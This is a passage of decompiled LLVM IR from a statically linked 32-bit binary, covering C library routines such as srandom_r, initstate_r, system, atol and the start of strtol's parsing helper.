  %v1_8053b41 = add i32 %v0_8053b41, 4
  store i32 %v1_8053b41, i32* %eax.global-to-local, align 4
  br i1 %v7_8053b3c, label %dec_label_pc_8053b4a, label %dec_label_pc_8053b46

dec_label_pc_8053b46:                             ; preds = %dec_label_pc_8053b29
  %v0_8053b46 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8053b46, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053b50

dec_label_pc_8053b4a:                             ; preds = %dec_label_pc_8053b29
  %v1_8053b4a = load i32, i32* %edi.global-to-local, align 4
  %v7_8053b4a = icmp ult i32 %v1_8053b41, %v1_8053b4a
  br i1 %v7_8053b4a, label %dec_label_pc_8053b50, label %dec_label_pc_8053b4e

dec_label_pc_8053b4e:                             ; preds = %dec_label_pc_8053b4a
  %v0_8053b4e = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8053b4e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b50

dec_label_pc_8053b50:                             ; preds = %dec_label_pc_8053b4a, %dec_label_pc_8053b46, %dec_label_pc_8053b4e
  %v0_8053b50 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053b50 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053b50 = inttoptr i32 %v1_8053b50 to i32*
  store i32 %v0_8053b50, i32* %v2_8053b50, align 4
  %v0_8053b52 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053b52 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053b52 = add i32 %v1_8053b52, 4
  %v3_8053b52 = inttoptr i32 %v2_8053b52 to i32*
  store i32 %v0_8053b52, i32* %v3_8053b52, align 4
  br label %dec_label_pc_8053b55

dec_label_pc_8053b55:                             ; preds = %dec_label_pc_8053b12, %dec_label_pc_8053b50
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8053b57 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053b57, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8053b1d, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8053b55, { 1, 0 }
  uselistorder label %dec_label_pc_8053b50, { 2, 0, 1 }
}

define i32 @srandom_r(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_8053b5c = load i32, i32* @ebp, align 4
  %v0_8053b5d = load i32, i32* @edi, align 4
  %v0_8053b5e = load i32, i32* @esi, align 4
  %v0_8053b5f = load i32, i32* @ebx, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* @esi, align 4
  %v4_8053b6a = trunc i64 %arg1 to i32
  store i32 %v4_8053b6a, i32* %eax.global-to-local, align 4
  %v1_8053b6e = add i32 %arg2, 12
  %v2_8053b6e = inttoptr i32 %v1_8053b6e to i32*
  %v3_8053b6e = load i32, i32* %v2_8053b6e, align 4
  store i32 %v3_8053b6e, i32* %edx.global-to-local, align 4
  %v6_8053b74 = icmp ugt i32 %v3_8053b6e, 4
  br i1 %v6_8053b74, label %dec_label_pc_8053be8, label %dec_label_pc_8053b76

dec_label_pc_8053b76:                             ; preds = %entry
  %v1_8053b76 = add i32 %arg2, 8
  %v2_8053b76 = inttoptr i32 %v1_8053b76 to i32*
  %v3_8053b76 = load i32, i32* %v2_8053b76, align 4
  store i32 %v3_8053b76, i32* %ebx.global-to-local, align 4
  %v1_8053b79 = icmp eq i32 %v4_8053b6a, 0
  %v1_8053b7b = icmp eq i1 %v1_8053b79, false
  br i1 %v1_8053b7b, label %dec_label_pc_8053b7f, label %dec_label_pc_8053b7d

dec_label_pc_8053b7d:                             ; preds = %dec_label_pc_8053b76
  %v1_8053b7d = and i32 %v4_8053b6a, -256
  %v2_8053b7d = or i32 %v1_8053b7d, 1
  store i32 %v2_8053b7d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b7f

dec_label_pc_8053b7f:                             ; preds = %dec_label_pc_8053b76, %dec_label_pc_8053b7d
  %v0_8053b7f = phi i32 [ %v4_8053b6a, %dec_label_pc_8053b76 ], [ %v2_8053b7d, %dec_label_pc_8053b7d ]
  %v2_8053b7f = inttoptr i32 %v3_8053b76 to i32*
  store i32 %v0_8053b7f, i32* %v2_8053b7f, align 4
  %v1_8053b81 = icmp eq i32 %v3_8053b6e, 0
  br i1 %v1_8053b81, label %dec_label_pc_8053be6, label %dec_label_pc_8053b85

dec_label_pc_8053b85:                             ; preds = %dec_label_pc_8053b7f
  %v0_8053b85 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8053b85, i32* %edx.global-to-local, align 4
  %v0_8053b87 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053b87, i32* %ecx.global-to-local, align 4
  %v0_8053b89 = load i32, i32* @esi, align 4
  %v1_8053b89 = add i32 %v0_8053b89, 16
  %v2_8053b89 = inttoptr i32 %v1_8053b89 to i32*
  %v3_8053b89 = load i32, i32* %v2_8053b89, align 4
  store i32 %v3_8053b89, i32* %eax.global-to-local, align 4
  %v4_8053b91 = sext i32 %v3_8053b89 to i64
  store i64 %v4_8053b91, i64* %stack_var_-40, align 8
  %v5_8053bc327 = icmp sgt i32 %v3_8053b89, 1
  br i1 %v5_8053bc327, label %dec_label_pc_8053b96, label %dec_label_pc_8053bc5

dec_label_pc_8053b96:                             ; preds = %dec_label_pc_8053b85, %dec_label_pc_8053b96.dec_label_pc_8053b96_crit_edge
  %v0_8053bba = phi i32 [ %v0_8053bba.pre, %dec_label_pc_8053b96.dec_label_pc_8053b96_crit_edge ], [ %v0_8053b87, %dec_label_pc_8053b85 ]
  %v0_8053b96 = phi i32 [ %v0_8053b96.pre, %dec_label_pc_8053b96.dec_label_pc_8053b96_crit_edge ], [ %v0_8053b85, %dec_label_pc_8053b85 ]
  %v0_8053bbd28 = phi i32 [ %v0_8053bc0.pre, %dec_label_pc_8053b96.dec_label_pc_8053b96_crit_edge ], [ 1, %dec_label_pc_8053b85 ]
  %v1_8053b9d = ashr i32 %v0_8053b96, 31
  %v2_8053b9e = zext i32 %v0_8053b96 to i64
  %v4_8053b9e = zext i32 %v1_8053b9d to i64
  %v5_8053b9e = mul nuw i64 %v4_8053b9e, 4294967296
  %v6_8053b9e = or i64 %v5_8053b9e, %v2_8053b9e
  %v8_8053b9e = sdiv i64 %v6_8053b9e, 127773
  %v9_8053b9e = trunc i64 %v8_8053b9e to i32
  %v10_8053b9e = srem i64 %v6_8053b9e, 127773
  %v3_8053ba4 = mul nsw i64 %v10_8053b9e, 16807
  %v4_8053ba4 = trunc i64 %v3_8053ba4 to i32
  %v3_8053baa = mul i32 %v9_8053b9e, 2836
  store i32 %v3_8053baa, i32* %eax.global-to-local, align 4
  %v2_8053bb0 = sub i32 %v4_8053ba4, %v3_8053baa
  %v13_8053bb0 = icmp slt i32 %v2_8053bb0, 0
  %v1_8053bb2 = icmp eq i1 %v13_8053bb0, false
  %v1_8053bb4 = add i32 %v2_8053bb0, 2147483647
  %v2_8053bb0.v1_8053bb4 = select i1 %v1_8053bb2, i32 %v2_8053bb0, i32 %v1_8053bb4
  store i32 %v2_8053bb0.v1_8053bb4, i32* %edx.global-to-local, align 4
  %v1_8053bba = add i32 %v0_8053bba, 4
  store i32 %v1_8053bba, i32* %ecx.global-to-local, align 4
  %v1_8053bbd = add i32 %v0_8053bbd28, 1
  store i32 %v1_8053bbd, i32* @edi, align 4
  %v2_8053bbe = inttoptr i32 %v1_8053bba to i32*
  store i32 %v2_8053bb0.v1_8053bb4, i32* %v2_8053bbe, align 4
  %v0_8053bc0.pre = load i32, i32* @edi, align 4
  %v3_8053bc0.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t12 = trunc i64 %v3_8053bc0.pre to i32
  %v5_8053bc3 = icmp slt i32 %v0_8053bc0.pre, %extract.t12
  br i1 %v5_8053bc3, label %dec_label_pc_8053b96.dec_label_pc_8053b96_crit_edge, label %dec_label_pc_8053bc0.dec_label_pc_8053bc5_crit_edge

dec_label_pc_8053b96.dec_label_pc_8053b96_crit_edge: ; preds = %dec_label_pc_8053b96
  %v0_8053b96.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_8053bba.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053b96

dec_label_pc_8053bc0.dec_label_pc_8053bc5_crit_edge: ; preds = %dec_label_pc_8053b96
  %v0_8053bc5.pre = load i32, i32* @esi, align 4
  %v0_8053bc8.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053bc5

dec_label_pc_8053bc5:                             ; preds = %dec_label_pc_8053bc0.dec_label_pc_8053bc5_crit_edge, %dec_label_pc_8053b85
  %v0_8053bc8 = phi i32 [ %v0_8053bc8.pre, %dec_label_pc_8053bc0.dec_label_pc_8053bc5_crit_edge ], [ %v0_8053b87, %dec_label_pc_8053b85 ]
  %v0_8053bc5 = phi i32 [ %v0_8053bc5.pre, %dec_label_pc_8053bc0.dec_label_pc_8053bc5_crit_edge ], [ %v0_8053b89, %dec_label_pc_8053b85 ]
  %v1_8053bc5 = add i32 %v0_8053bc5, 20
  %v2_8053bc5 = inttoptr i32 %v1_8053bc5 to i32*
  %v3_8053bc5 = load i32, i32* %v2_8053bc5, align 4
  store i32 %v3_8053bc5, i32* %eax.global-to-local, align 4
  %v2_8053bc8 = add i32 %v0_8053bc5, 4
  %v3_8053bc8 = inttoptr i32 %v2_8053bc8 to i32*
  store i32 %v0_8053bc8, i32* %v3_8053bc8, align 4
  %v0_8053bcb = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053bcb = load i32, i32* %eax.global-to-local, align 4
  %v2_8053bcb = mul i32 %v1_8053bcb, 4
  %v3_8053bcb = add i32 %v2_8053bcb, %v0_8053bcb
  store i32 %v3_8053bcb, i32* %eax.global-to-local, align 4
  %v1_8053bce = load i32, i32* @esi, align 4
  %v2_8053bce = inttoptr i32 %v1_8053bce to i32*
  store i32 %v3_8053bcb, i32* %v2_8053bce, align 4
  %v3_8053bd0 = load i64, i64* %stack_var_-40, align 8
  %v6_8053bd0 = mul nsw i64 %v3_8053bd0, 10
  %v7_8053bd0 = trunc i64 %v6_8053bd0 to i32
  %v2_8053bd6 = ptrtoint i32* %stack_var_-20 to i32
  %v1_8053be324 = add i32 %v7_8053bd0, -1
  %v9_8053be325 = icmp slt i32 %v1_8053be324, 0
  store i32 %v1_8053be324, i32* @ebx, align 4
  %v1_8053be426 = icmp eq i1 %v9_8053be325, false
  br i1 %v1_8053be426, label %dec_label_pc_8053bd6, label %dec_label_pc_8053be6

dec_label_pc_8053bd6:                             ; preds = %dec_label_pc_8053bc5, %dec_label_pc_8053bd6
  store i32 %v2_8053bd6, i32* %eax.global-to-local, align 4
  %v0_8053bdb = load i32, i32* @esi, align 4
  %v2_8053bdc = inttoptr i32 %v0_8053bdb to i32*
  %v3_8053bdc = call i32 @__GI_random_r(i32* %v2_8053bdc, i32 %v2_8053bd6)
  store i32 %v0_8053bdb, i32* %eax.global-to-local, align 4
  store i32 %v2_8053bd6, i32* %edx.global-to-local, align 4
  %v0_8053be3.pre = load i32, i32* @ebx, align 4
  %v1_8053be3 = add i32 %v0_8053be3.pre, -1
  %v9_8053be3 = icmp slt i32 %v1_8053be3, 0
  store i32 %v1_8053be3, i32* @ebx, align 4
  %v1_8053be4 = icmp eq i1 %v9_8053be3, false
  br i1 %v1_8053be4, label %dec_label_pc_8053bd6, label %dec_label_pc_8053be6

dec_label_pc_8053be6:                             ; preds = %dec_label_pc_8053bc5, %dec_label_pc_8053bd6, %dec_label_pc_8053b7f
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053be8

dec_label_pc_8053be8:                             ; preds = %entry, %dec_label_pc_8053be6
  %v0_8053beb = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_8053be6 ]
  store i32 %v0_8053beb, i32* %eax.global-to-local, align 4
  store i32 %v0_8053b5f, i32* @ebx, align 4
  store i32 %v0_8053b5e, i32* @esi, align 4
  store i32 %v0_8053b5d, i32* @edi, align 4
  store i32 %v0_8053b5c, i32* @ebp, align 4
  ret i32 %v0_8053beb

; uselistorder directives
  uselistorder i32 %v0_8053beb, { 1, 0 }
  uselistorder i32 %v1_8053be3, { 1, 0 }
  uselistorder i32 %v0_8053bc5, { 1, 0 }
  uselistorder i32 %v0_8053bc0.pre, { 1, 0 }
  uselistorder i32 %v2_8053bb0.v1_8053bb4, { 1, 0 }
  uselistorder i32 %v0_8053b96, { 1, 0 }
  uselistorder i32 %v0_8053b87, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053be8, { 1, 0 }
  uselistorder label %dec_label_pc_8053be6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053bd6, { 1, 0 }
  uselistorder label %dec_label_pc_8053b96, { 1, 0 }
  uselistorder label %dec_label_pc_8053b7f, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_8053bf5 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp17 = icmp ult i32 %arg3, 128
  br i1 %tmp17, label %dec_label_pc_8053c16, label %dec_label_pc_8053c0a

dec_label_pc_8053c0a:                             ; preds = %entry
  %v2_8053c0a = icmp ult i32 %arg3, 256
  %v1_8053c11 = select i1 %v2_8053c0a, i32 5, i32 4
  store i32 %v1_8053c11, i32* @ebx, align 4
  br label %dec_label_pc_8053c2c

dec_label_pc_8053c16:                             ; preds = %entry
  %v6_8053c19 = icmp ugt i32 %arg3, 31
  br i1 %v6_8053c19, label %dec_label_pc_8053c24, label %dec_label_pc_8053c1b

dec_label_pc_8053c1b:                             ; preds = %dec_label_pc_8053c16
  store i32 0, i32* @ebx, align 4
  %v6_8053c20 = icmp ugt i32 %arg3, 7
  br i1 %v6_8053c20, label %dec_label_pc_8053c2c, label %dec_label_pc_8053c7c

dec_label_pc_8053c24:                             ; preds = %dec_label_pc_8053c16
  %v2_8053c24 = icmp ult i32 %arg3, 64
  %v1_8053c29 = select i1 %v2_8053c24, i32 3, i32 2
  store i32 %v1_8053c29, i32* @ebx, align 4
  br label %dec_label_pc_8053c2c

dec_label_pc_8053c2c:                             ; preds = %dec_label_pc_8053c1b, %dec_label_pc_8053c0a, %dec_label_pc_8053c24
  %v0_8053c2c = phi i32 [ 0, %dec_label_pc_8053c1b ], [ %v1_8053c11, %dec_label_pc_8053c0a ], [ %v1_8053c29, %dec_label_pc_8053c24 ]
  %v1_8053c2c = mul nuw nsw i32 %v0_8053c2c, 4
  %v2_8053c2c = add i32 %v1_8053c2c, ptrtoint (i32* @global_var_8059f34.521 to i32)
  %v3_8053c2c = inttoptr i32 %v2_8053c2c to i32*
  %v4_8053c2c = load i32, i32* %v3_8053c2c, align 4
  store i32 %v4_8053c2c, i32* %eax.global-to-local, align 4
  %v1_8053c33 = add i32 %tmp7, 4
  store i32 %v1_8053c33, i32* @esi, align 4
  %v2_8053c36 = add i32 %arg4, 16
  %v3_8053c36 = inttoptr i32 %v2_8053c36 to i32*
  store i32 %v4_8053c2c, i32* %v3_8053c36, align 4
  %v0_8053c39 = load i32, i32* @ebx, align 4
  %v1_8053c39 = mul i32 %v0_8053c39, 4
  %v2_8053c39 = add i32 %v1_8053c39, ptrtoint (i32* @global_var_8059f20.522 to i32)
  %v3_8053c39 = inttoptr i32 %v2_8053c39 to i32*
  %v4_8053c39 = load i32, i32* %v3_8053c39, align 4
  store i32 %v4_8053c39, i32* %edx.global-to-local, align 4
  %v0_8053c40 = load i32, i32* @esi, align 4
  %v1_8053c40 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053c40 = mul i32 %v1_8053c40, 4
  %v3_8053c40 = add i32 %v2_8053c40, %v0_8053c40
  store i32 %v3_8053c40, i32* %eax.global-to-local, align 4
  %v1_8053c43 = load i32, i32* @edi, align 4
  %v2_8053c43 = add i32 %v1_8053c43, 12
  %v3_8053c43 = inttoptr i32 %v2_8053c43 to i32*
  store i32 %v0_8053c39, i32* %v3_8053c43, align 4
  %v0_8053c46 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053c46 = load i32, i32* @edi, align 4
  %v2_8053c46 = add i32 %v1_8053c46, 20
  %v3_8053c46 = inttoptr i32 %v2_8053c46 to i32*
  store i32 %v0_8053c46, i32* %v3_8053c46, align 4
  %v0_8053c49 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053c49 = load i32, i32* @edi, align 4
  %v2_8053c49 = add i32 %v1_8053c49, 24
  %v3_8053c49 = inttoptr i32 %v2_8053c49 to i32*
  store i32 %v0_8053c49, i32* %v3_8053c49, align 4
  %v0_8053c4c = load i32, i32* @esi, align 4
  %v1_8053c4c = load i32, i32* @edi, align 4
  %v2_8053c4c = add i32 %v1_8053c4c, 8
  %v3_8053c4c = inttoptr i32 %v2_8053c4c to i32*
  store i32 %v0_8053c4c, i32* %v3_8053c4c, align 4
  %v0_8053c4f = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8053c54 = sext i32 %arg1 to i64
  %v3_8053c54 = call i32 @srandom_r(i64 %v2_8053c54, i32 %v0_8053c4f)
  %v0_8053c59 = load i32, i32* @ebp, align 4
  %v1_8053c59 = inttoptr i32 %v0_8053c59 to i32*
  store i32 0, i32* %v1_8053c59, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8053c64 = load i32, i32* @ebx, align 4
  %v1_8053c64 = icmp eq i32 %v0_8053c64, 0
  br i1 %v1_8053c64, label %dec_label_pc_8053c95, label %dec_label_pc_8053c68

dec_label_pc_8053c68:                             ; preds = %dec_label_pc_8053c2c
  %v0_8053c68 = load i32, i32* @edi, align 4
  %v1_8053c68 = add i32 %v0_8053c68, 4
  %v2_8053c68 = inttoptr i32 %v1_8053c68 to i32*
  %v3_8053c68 = load i32, i32* %v2_8053c68, align 4
  %v1_8053c6b = load i32, i32* @esi, align 4
  %v2_8053c6b = sub i32 %v3_8053c68, %v1_8053c6b
  %v2_8053c6d = sdiv i32 %v2_8053c6b, 4
  %v3_8053c70 = mul i32 %v2_8053c6d, 5
  %v2_8053c73 = add i32 %v3_8053c70, %v0_8053c64
  %v1_8053c75 = load i32, i32* @ebp, align 4
  %v2_8053c75 = inttoptr i32 %v1_8053c75 to i32*
  store i32 %v2_8053c73, i32* %v2_8053c75, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053c95

dec_label_pc_8053c7c:                             ; preds = %dec_label_pc_8053c1b
  %v1_8053c7c = call i32 @__errno_location(i32 %v0_8053bf5)
  store i32 %v1_8053c7c, i32* %eax.global-to-local, align 4
  %v1_8053c81 = inttoptr i32 %v1_8053c7c to i32*
  store i32 22, i32* %v1_8053c81, align 4
  %v0_8053c87 = load i32, i32* %stack_var_-36, align 4
  %v1_8053c87 = call i32 @__errno_location(i32 %v0_8053c87)
  %v1_8053c8c = inttoptr i32 %v1_8053c87 to i32*
  store i32 22, i32* %v1_8053c8c, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053c95

dec_label_pc_8053c95:                             ; preds = %dec_label_pc_8053c2c, %dec_label_pc_8053c68, %dec_label_pc_8053c7c
  %v0_8053c9c = phi i32 [ 0, %dec_label_pc_8053c2c ], [ 0, %dec_label_pc_8053c68 ], [ -1, %dec_label_pc_8053c7c ]
  ret i32 %v0_8053c9c

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053c95, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053c2c, { 2, 0, 1 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8053ca0 = load i32, i32* @ebx, align 4
  %v4_8053ca9 = icmp eq i32 %arg1, 0
  br i1 %v4_8053ca9, label %dec_label_pc_8053dcc, label %dec_label_pc_8053cb4

dec_label_pc_8053cb4:                             ; preds = %entry
  %v2_8053cba = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8053cc9 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 2, i32* @ebx, align 4
  %v2_8053cd8 = call i32 @__bsd_signal(i32 17, i32 0)
  %v1_8053ce1 = call i32 @__vfork(i32 %v2_8053cd8)
  store i32 %v1_8053ce1, i32* @ebx, align 4
  %v2_8053ceb = icmp slt i32 %v1_8053ce1, 0
  %v2_8053cee = icmp eq i1 %v2_8053ceb, false
  br i1 %v2_8053cee, label %dec_label_pc_8053d1f, label %dec_label_pc_8053cf0

dec_label_pc_8053cf0:                             ; preds = %dec_label_pc_8053cb4
  %v2_8053cf8 = call i32 @__bsd_signal(i32 3, i32 %v2_8053cba)
  store i32 %v2_8053cba, i32* @edx, align 4
  %v2_8053d05 = call i32 @__bsd_signal(i32 2, i32 %v2_8053cc9)
  store i32 2, i32* @ebx, align 4
  %v2_8053d12 = call i32 @__bsd_signal(i32 17, i32 %v2_8053cd8)
  br label %dec_label_pc_8053dc9

dec_label_pc_8053d1f:                             ; preds = %dec_label_pc_8053cb4
  %v1_8053ceb = icmp eq i32 %v1_8053ce1, 0
  %v1_8053d1f = icmp eq i1 %v1_8053ceb, false
  br i1 %v1_8053d1f, label %dec_label_pc_8053d6b, label %dec_label_pc_8053d21

dec_label_pc_8053d21:                             ; preds = %dec_label_pc_8053d1f
  %v2_8053d27 = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 0, i32* @edx, align 4
  %v2_8053d32 = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 2, i32* @ebx, align 4
  %v2_8053d3d = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_8053d5c = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_8059f4b.525 to i32), i32 ptrtoint ([3 x i8]* @global_var_8059f50.524 to i32), i32 ptrtoint ([3 x i8]* @global_var_8059f48.523 to i32), i32 %arg1, i32 0)
  %v1_8053d66 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8053d6b:                             ; preds = %dec_label_pc_8053d1f
  %v2_8053d71 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8053d7c = call i32 @__bsd_signal(i32 2, i32 1)
  %v2_8053d81 = ptrtoint i32* %stack_var_-8 to i32
  %v0_8053d8a = load i32, i32* @ebx, align 4
  %v7_8053d8b = call i32 @wait4(i32 %v0_8053d8a, i32 %v2_8053d81, i32 0, i32 0)
  %v8_8053d93 = icmp eq i32 %v7_8053d8b, -1
  %v1_8053d94 = icmp eq i1 %v8_8053d93, false
  br i1 %v1_8053d94, label %dec_label_pc_8053d9e, label %dec_label_pc_8053d96

dec_label_pc_8053d96:                             ; preds = %dec_label_pc_8053d6b
  store i32 -1, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8053d9e

dec_label_pc_8053d9e:                             ; preds = %dec_label_pc_8053d6b, %dec_label_pc_8053d96
  %v2_8053da6 = call i32 @__bsd_signal(i32 3, i32 %v2_8053cba)
  store i32 %v2_8053cba, i32* @ebx, align 4
  %v2_8053db3 = call i32 @__bsd_signal(i32 2, i32 %v2_8053cc9)
  store i32 %v2_8053cc9, i32* @edx, align 4
  %v2_8053dc0 = call i32 @__bsd_signal(i32 17, i32 %v2_8053cd8)
  %v3_8053dc5 = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8053dc9

dec_label_pc_8053dc9:                             ; preds = %dec_label_pc_8053cf0, %dec_label_pc_8053d9e
  %storemerge = phi i32 [ -1, %dec_label_pc_8053cf0 ], [ %v3_8053dc5, %dec_label_pc_8053d9e ]
  br label %dec_label_pc_8053dcc

dec_label_pc_8053dcc:                             ; preds = %entry, %dec_label_pc_8053dc9
  %v0_8053dd0 = phi i32 [ 1, %entry ], [ %storemerge, %dec_label_pc_8053dc9 ]
  store i32 %v0_8053ca0, i32* @ebx, align 4
  ret i32 %v0_8053dd0

; uselistorder directives
  uselistorder i32 %v1_8053ce1, { 1, 2, 0 }
  uselistorder i32 %v2_8053cd8, { 1, 0, 2 }
  uselistorder i32 %v2_8053cc9, { 0, 2, 1 }
  uselistorder i32 %v2_8053cba, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 (i32)* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_8053dcc, { 1, 0 }
  uselistorder label %dec_label_pc_8053dc9, { 1, 0 }
  uselistorder label %dec_label_pc_8053d9e, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8053ddf = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_8053ddf
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8053df9 = inttoptr i32 %arg1 to i8*
  %v5_8053df9 = call i32 @_stdlib_strto_l(i8* %v4_8053df9, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8053df9
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_8053e07 = load i32, i32* @ebx, align 4
  store i32 %v0_8053e07, i32* %stack_var_-16, align 4
  %v0_8053e0b = load i32, i32* @global_var_805b298, align 8
  %v4_8053e11 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8053e11, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_8053e11, i32* %ebx.global-to-local, align 4
  %v2_8053e1e41 = load i8, i8* %arg1, align 1
  %v3_8053e1e42 = sext i8 %v2_8053e1e41 to i32
  store i32 %v3_8053e1e42, i32* %eax.global-to-local, align 4
  %v2_8053e2143 = mul nsw i32 %v3_8053e1e42, 2
  %v3_8053e2144 = add i32 %v2_8053e2143, %v0_8053e0b
  %v4_8053e2145 = inttoptr i32 %v3_8053e2144 to i8*
  %v5_8053e2146 = load i8, i8* %v4_8053e2145, align 1
  %v6_8053e2147 = and i8 %v5_8053e2146, 32
  %v7_8053e2148 = icmp eq i8 %v6_8053e2147, 0
  %v1_8053e2549 = icmp eq i1 %v7_8053e2148, false
  br i1 %v1_8053e2549, label %dec_label_pc_8053e1d, label %dec_label_pc_8053e27

dec_label_pc_8053e1d:                             ; preds = %entry, %dec_label_pc_8053e1d
  %v0_8053e1d50 = phi i32 [ %v1_8053e1d, %dec_label_pc_8053e1d ], [ %v4_8053e11, %entry ]
  %v1_8053e1d = add i32 %v0_8053e1d50, 1
  store i32 %v1_8053e1d, i32* %ebx.global-to-local, align 4
  %v1_8053e1e = inttoptr i32 %v1_8053e1d to i8*
  %v2_8053e1e = load i8, i8* %v1_8053e1e, align 1
  %v3_8053e1e = sext i8 %v2_8053e1e to i32
  store i32 %v3_8053e1e, i32* %eax.global-to-local, align 4
  %v2_8053e21 = mul nsw i32 %v3_8053e1e, 2
  %v3_8053e21 = add i32 %v2_8053e21, %v0_8053e0b
  %v4_8053e21 = inttoptr i32 %v3_8053e21 to i8*
  %v5_8053e21 = load i8, i8* %v4_8053e21, align 1
  %v6_8053e21 = and i8 %v5_8053e21, 32
  %v7_8053e21 = icmp eq i8 %v6_8053e21, 0
  %v1_8053e25 = icmp eq i1 %v7_8053e21, false
  br i1 %v1_8053e25, label %dec_label_pc_8053e1d, label %dec_label_pc_8053e27

dec_label_pc_8053e27:                             ; preds = %dec_label_pc_8053e1d, %entry
  %v0_8053e1d.lcssa = phi i32 [ %v4_8053e11, %entry ], [ %v1_8053e1d, %dec_label_pc_8053e1d ]
  %v2_8053e1e.lcssa = phi i8 [ %v2_8053e1e41, %entry ], [ %v2_8053e1e, %dec_label_pc_8053e1d ]
  %v3_8053e1e.lcssa = phi i32 [ %v3_8053e1e42, %entry ], [ %v3_8053e1e, %dec_label_pc_8053e1d ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_8053e27 = icmp eq i8 %v2_8053e1e.lcssa, 43
  br i1 %v9_8053e27, label %dec_label_pc_8053e3c, label %dec_label_pc_8053e2c

